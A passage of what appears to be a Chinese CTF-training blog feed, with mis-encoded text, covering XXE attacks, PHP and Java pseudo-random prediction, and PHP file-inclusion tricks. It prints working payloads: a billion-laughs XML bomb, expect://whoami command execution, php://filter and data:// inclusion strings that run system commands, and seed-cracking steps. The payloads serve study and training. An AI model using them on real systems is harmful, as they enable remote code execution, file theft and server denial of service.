class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="hljs-string">&#x27;/&#x27;</span><br>        <span class="hljs-built_in">print</span> string<br>        build_xml(string)<br>    <span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>ç«¯å£æ‰«æ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">data</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://127.0.0.1:i/&quot;</span> [</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><p>çˆ†ç ´ i</p><h2 id="DOS-æ”»å‡»"><a href="#DOS-æ”»å‡»" class="headerlink" title="DOS æ”»å‡»"></a>DOS æ”»å‡»</h2><p>äº§ç”Ÿ 3G å·¦å³çš„åƒåœ¾æ–‡æ¡£ï¼Œä½¿æœåŠ¡å™¨å®•æœº</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-params">&lt;?xml version=&quot;<span class="hljs-number">1.0</span>&quot;?&gt;</span><br>     <span class="hljs-params">&lt;!DOCTYPE lolz [</span><br><span class="hljs-params">     &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol2 &quot;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol3 &quot;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol4 &quot;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol5 &quot;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol6 &quot;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol7 &quot;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol8 &quot;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol9 &quot;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;&quot;&gt;</span><br>     ]&gt;<br>     <span class="hljs-params">&lt;lolz&gt;</span><span class="hljs-variable">&amp;lol9</span>;<span class="hljs-params">&lt;/lolz&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨ Unix ä¸­ï¼Œä½¿ç”¨/dev/random æ–‡ä»¶å†…å®¹ä»£æ›¿å®ä½“ï¼Œåˆ™ç”¨</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///dev/random&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="PHP-RCE"><a href="#PHP-RCE" class="headerlink" title="PHP RCE"></a>PHP RCE</h2><p>åœ¨å¼€å¯äº† expect æ‰©å±•çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">root</span> [ <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;expect://whoami&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="é˜²å¾¡æªæ–½"><a href="#é˜²å¾¡æªæ–½" class="headerlink" title="é˜²å¾¡æªæ–½"></a>é˜²å¾¡æªæ–½</h1><p>1.ç¦ç”¨å¤–éƒ¨å®ä½“</p><blockquote><p>libxml_disable_entity_loader(true)</p></blockquote><p>2.è¿‡æ»¤éæ³•è¾“å…¥</p><p>åŒ¹é…å…³é”®å­—<code>&lt;!DOCTYPE &lt;!ENTITY SYSTEM PUBLIC</code></p><p>3.ç¦æ­¢å¤–éƒ¨å®ä½“çš„è§£æ</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¼ªéšæœºæ•°</title>
    <link href="/2021/11/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%88%86%E6%9E%90/"/>
    <url>/2021/11/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><blockquote><p>mt_scrand()//æ’­ç§ Mersenne Twister éšæœºæ•°ç”Ÿæˆå™¨</p><p>mt_rand()//ç”Ÿæˆéšæœºæ•°</p></blockquote><p>mt_scrand()é€šè¿‡ seed åˆ†å‘ç§å­ï¼Œé€šè¿‡ mt_rand()ç”Ÿæˆä¼ªéšæœºæ•°</p><p>ä» PHP 4.2.0 å¼€å§‹ï¼Œéšæœºæ•°ç”Ÿæˆå™¨è‡ªåŠ¨æ’­ç§ï¼Œå› æ­¤æ²¡æœ‰å¿…è¦ä½¿ç”¨è¯¥å‡½æ•° å› æ­¤ä¸éœ€è¦æ’­ç§ï¼Œå¹¶ä¸”å¦‚æœè®¾ç½®äº† seed å‚æ•° ç”Ÿæˆçš„éšæœºæ•°å°±æ˜¯ä¼ªéšæœºæ•°ï¼Œæ„æ€å°±æ˜¯æ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•° æ˜¯ä¸€æ ·çš„</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114013004978.png"></p><p>å½“ç§å­ä¸å˜æ—¶ï¼Œç”Ÿæˆçš„éšæœºæ•°æ˜¯ä¸å˜çš„ï¼Œè¿™å°±æ˜¯ä¼ªéšæœºæ•°çš„æ¼æ´æ‰€åœ¨</p><p>ctfshow25</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br>    mt_srand(hexdec(substr(md5(<span class="hljs-variable">$flag</span>), <span class="hljs-number">0</span>,<span class="hljs-number">8</span>)));<br>    <span class="hljs-variable">$rand</span> = intval(<span class="hljs-variable">$r</span>)-intval(mt_rand());<br>    <span class="hljs-keyword">if</span>((!<span class="hljs-variable">$rand</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$rand</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">&#x27;cat /proc/version&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬è¦è·å¾—ç¬¬ä¸€ä¸ªéšæœºæ•°ï¼Œæ ¹æ®æ¡ä»¶ï¼Œä¼ å…¥ r=0ï¼›ä½¿ç”¨å·¥å…·å¯¹å¾—åˆ°çš„ç¬¬ä¸€ä¸ªéšæœºæ•°è¿›è¡Œé€†æ¨ï¼Œ<a href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a></p><p>å¾—åˆ°<strong>ä¸¤ä¸ªå¯èƒ½</strong>çš„éšæœºæ•°ç§å­ï¼Œå³å€¼<code>hexdec(substr(md5($flag), 0,8))</code></p><p>å½“<code>$_COOKIE[&#39;token&#39;]==(mt_rand()+mt_rand())</code>æ—¶å¾—åˆ° flagï¼Œç”±äºå‰é¢å·²ç»æ‰§è¡Œäº†ä¸€æ¬¡<code>mt_rand()</code>ï¼Œæˆ‘ä»¬éœ€è¦å¾—åˆ°åé¢ä¸¤æ¬¡çš„<code>mt_rand()</code>ç›¸åŠ </p><p>ç¼–å†™è„šæœ¬ï¼Œå¯¹ä¸¤ä¸ªç§å­è¿›è¡Œå°è¯•ï¼Œå³å¾—åˆ°ä¸¤ä¸ª<code>mt\_rand()+mt\_rand()</code>è¿›è¡Œå°è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_scand(å¾—åˆ°çš„ç§å­å€¼);<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand()+mt_rand();<br></code></pre></td></tr></table></figure><p>r=ä»é¡µé¢å¾—åˆ°çš„ç¬¬ä¸€ä¸ªéšæœºæ•°å€¼ Cooke:token=è„šæœ¬å¾—åˆ°çš„ä¸¤ä¸ªéšæœºæ•°å€¼ç›¸åŠ </p><p>çºµè§‚æ•´ä½“éš¾åº¦ä¸å¤§ï¼Œä¸»è¦ç†è§£æ¼æ´åŸç†ï¼Œä»¥åŠé¢˜ç›®ä½¿ç”¨çš„æ˜¯åé¢ä¸¤ä¸ªéšæœºå€¼çš„ç›¸åŠ </p><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><p>å¼ºä¼ªéšæœºæ•° RNG å®ç°<code>java.security.SecureRandom</code>ç±»ï¼Œè¯¥ç±»ä½¿ç”¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸­å¤§å°ï¼Œçº¿ç¨‹ä¼‘çœ æ—¶é—´ç­‰çš„å€¼ä½œä¸ºéšæœºæ•°ç§å­ï¼›è€Œå¼±ä¼ªéšæœºæ•°å®ç° PRNG<code>java.util.Random</code>ç±»ï¼Œé»˜è®¤ä½¿ç”¨å½“å‰æ—¶é—´ä½œä¸ºç§å­ï¼Œå¹¶ä¸”é‡‡ç”¨çº¿æ€§åŒä½™æ³•è®¡ç®—ä¸‹ä¸€ä¸ªéšæœºæ•°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> learn;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">World</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Random r1 = <span class="hljs-keyword">new</span> Random(<span class="hljs-number">1</span>);<br>        System.out.println(<span class="hljs-string">&quot;r1.nextINT(12)=&quot;</span> + r1.nextInt(<span class="hljs-number">12</span>));<br><br>        Random r2 = <span class="hljs-keyword">new</span> Random(<span class="hljs-number">1</span>);<br>        System.out.println(<span class="hljs-string">&quot;r2.nextINT(12)=&quot;</span> + r2.nextInt(<span class="hljs-number">12</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><blockquote><p>r1.nextINT(12)=5<br>r2.nextINT(12)=5</p></blockquote><p>æ— è®ºæ‰§è¡Œå¤šå°‘æ¬¡ï¼Œç»“æœéƒ½ä¸ä¼šæ”¹å˜ï¼ŒRandom ç”Ÿæˆçš„éšæœºæ•°æ˜¯ä¼ªéšæœºæ•°ï¼Œè¿™å°±å¯ä»¥é¢„æµ‹<code>java.util.Random</code>ã€‚è°ƒç”¨<code>random.nextInt</code>ç”Ÿæˆä¸‰ä¸ªè¿ç»­çš„éšæœºæ•°ï¼Œæ ¹æ®å‰ä¸¤ä¸ªéšæœºæ•°å°±å¯ä»¥é¢„æµ‹ç¬¬ä¸‰ä¸ªéšæœºæ•°ã€‚è¿™é‡Œæˆ‘ä»¬è·Ÿä¸€ä¸‹æºä»£ç <img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114164615749.png"></p><p>è°ƒç”¨ next æ–¹æ³•ï¼Œå¦‚æœ bound æ˜¯éæ­£ï¼ŒæŠ›å‡ºå¼‚å¸¸</p><p>ä¼ å‚ 31ï¼Œ<code>bound&amp;m)==0</code>åˆ¤æ–­ bound æ˜¯å¦ä¸º 2 çš„ x æ¬¡æ–¹ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ r å€¼å–<code>(int)((bound * (long)r) &gt;&gt; 31)</code>ï¼Œnext(31)ä¼ äº†ä»€ä¹ˆå€¼ï¼Ÿè·Ÿè¿› next<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114165211667.png"></p><p>Random.class æœ‰ä¸‰ä¸ªå¸¸é‡</p><blockquote><p>private static final long multiplier = 0x5DEECE66DL;//è¿›åˆ¶æ˜¯ 25214903917</p><p>private static final long addend = 0xBL;//åè¿›åˆ¶æ˜¯ 11</p><p>private static final long mask = (1L &lt;&lt; 48) - 1;//åè¿›åˆ¶æ˜¯ 281474976710655ï¼Œåå…­è¿›åˆ¶æ˜¯ 0xffffffffffff</p></blockquote><p>æ„é€ æ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114202701125.png"></p><blockquote><p>oldseed æ˜¯(0x2F^0x5DEECE66D)&amp;0xffffffffffff çš„å€¼ 0x5DEECE642ï¼Œ nextseed ä¸ºï¼ˆoldseed*0x5DEECE66D+0xBï¼‰&amp; 0xffffffffffff çš„å€¼ 0xBA2442955625ï¼Œseed.compareAndSet(oldseed, nextseed)åˆ¤æ–­ nextseed æ˜¯å¦ä¸ºé¢„æœŸçš„ç»“æœï¼Œ å¦‚æœæ˜¯é¢„æœŸç»“æœè¿”å› 0xBA2442955625 &gt;&gt;&gt; (48 - 31)ä¸º 0x5D12214Aï¼›å› æ­¤ next(31)ä¸º 0x5D12214A(åè¿›åˆ¶ä¸º 1561469258)</p></blockquote><p>å°±æ˜¯è¯´éšæœºæ•°ç§å­ oldseed å’Œåä¸€ä¸ªéšæœºæ•°ç§å­ nextseed éƒ½è¢«å®šä¹‰ä¸º long ç±»å‹ï¼Œè¿”å›ä¸ºä¸‹ä¸€ä¸ªç§å­å³ç§» 48-31=17 ä½åå¼ºåˆ¶è½¬æ¢ int çš„ç»“æœ</p><p>while é‡Œçš„ compareAndSet æ–¹æ³•æ¯”è¾ƒå½“å‰ç§å­æ˜¯å¦ä¸º oldseedï¼Œå¦‚æœæ˜¯çš„è¯å°±</p><p>æ›´æ–°ä¸º nextseedï¼Œä¸€èˆ¬éƒ½ä¼šè¿”å› trueï¼Œä¸‹ä¸€ä¸ªç§å­çš„æ›´æ–°ç®—æ³•åœ¨ doâ€¦while ç»“æ„é‡Œé¢ï¼Œ<code>nextseed=(oldseed * multiplier + addend) &amp; mask</code></p><p>//java.util.Random <a href="https://bbs.csdn.net/topics/390855511">https://bbs.csdn.net/topics/390855511</a></p><p>//AtomicLong<a href="https://blog.csdn.net/weixin_42146366/article/details/87820373">https://blog.csdn.net/weixin_42146366/article/details/87820373</a></p><ul><li>é¢„æµ‹æ–¹æ³•</li></ul><blockquote><p>å¦‚æœæŠŠç”Ÿæˆç¬¬ä¸€ä¸ªéšæœºæ•°çš„ç§å­å®šä¹‰ä¸º seed1ï¼Œseed2ï¼Œseed3 å¾€åé¡ºå»¶çš„è¯ï¼Œseed1 å³ç§» 16 ä½å°±æ˜¯ç¬¬ä¸€ä¸ªéšæœºæ•°çš„å€¼ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªéšæœºæ•°ä¸¢äº† 16 ä½ï¼Œå¯¼è‡´ seed1 å°±æœ‰ 2 çš„ 16 æ¬¡æ–¹ç§å¯èƒ½ã€‚</p><p>æŠŠ 2 çš„ 16 æ¬¡æ–¹ç§å¯èƒ½å¸¦å…¥è®¡ç®—ä¸‹ä¸€ä¸ª seed2ï¼Œå¹¶ä¸”å³ç§»æŸ¥çœ‹æ˜¯å¦å’Œç¬¬äºŒä¸ªéšæœºæ•°çš„å€¼ç›¸ç­‰å°±èƒ½ç¡®å®šæ˜¯å¦æ­£ç¡®çš„æ‰¾åˆ°äº† seed1ã€‚</p><p>å¦‚æœå‰ä¸¤ä¸ªæ•°æ˜¯æ­£æ•°ï¼Œä½†ç¬¬ä¸‰ä¸ªæ•°æ˜¯è´Ÿæ•°ï¼Œåªéœ€è¦å¯¹å¾—åˆ°çš„è¡¥ç å†æ±‚ä¸€æ¬¡è¡¥ç å³å¯ï¼Œä¹Ÿå°±æ˜¯å–åååŠ  1ã€‚</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ–‡ä»¶åŒ…å«</title>
    <link href="/2021/10/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2021/10/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>?file=data://text/plain,&lt;?php system(â€˜tac flag.phpâ€™);?&gt;</p><p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p></blockquote><ul><li>æ—¥å¿—åŒ…å«</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819110931740.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819111129373.png"></p><ul><li>session æ–‡ä»¶ç«äº‰åŒ…å«</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç‚¹è¢«è¿‡æ»¤äº†ï¼Œå°±ä¸èƒ½åŒ…å«æ—¥å¿—æ–‡ä»¶äº†</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210822104732779.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210822104757678.png"></p><p>æ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰ Session ID çš„ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨<code>Cookie</code>é‡Œè®¾ç½®<code>PHPSESSID=flag</code>ï¼ŒPHP å°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š<code>/tmp/sess_flag</code>ã€‚å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ– Sessionï¼ŒPHP ä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ– Session,å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ã€‚åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œsession æ–‡ä»¶ä¸€èˆ¬çš„é»˜è®¤å­˜å‚¨ä½ç½®ä¸º <code>/tmp</code>æˆ–<code>/var/lib/php/session</code></p><p>ä½†æ˜¯<strong>session.upload_progress.cleanup é»˜è®¤æ˜¯å¼€å¯çš„ï¼Œä¸€æ—¦è¯»å–äº†æ‰€æœ‰ POST æ•°æ®ï¼Œå®ƒå°±ä¼šæ¸…é™¤è¿›åº¦ä¿¡æ¯</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210822124557917.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span 